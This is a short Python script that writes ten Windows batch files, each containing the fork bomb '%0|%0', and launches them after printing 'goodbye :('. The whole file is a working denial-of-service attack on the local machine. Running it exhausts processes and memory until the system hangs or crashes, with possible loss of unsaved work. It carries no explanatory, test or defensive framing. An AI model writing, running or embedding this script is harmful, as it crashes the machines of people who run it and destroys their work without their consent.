import os
import time

print("goodbye :(")
time.sleep(1)
x = 1

for i in range (0, 10):
    f = open("forkb" + str(x) + ".bat","w")
    f.write("%0|%0")
    f.close()
    #time.sleep(1)
    os.startfile("forkb" + str(x) + ".bat")
    x = x + 1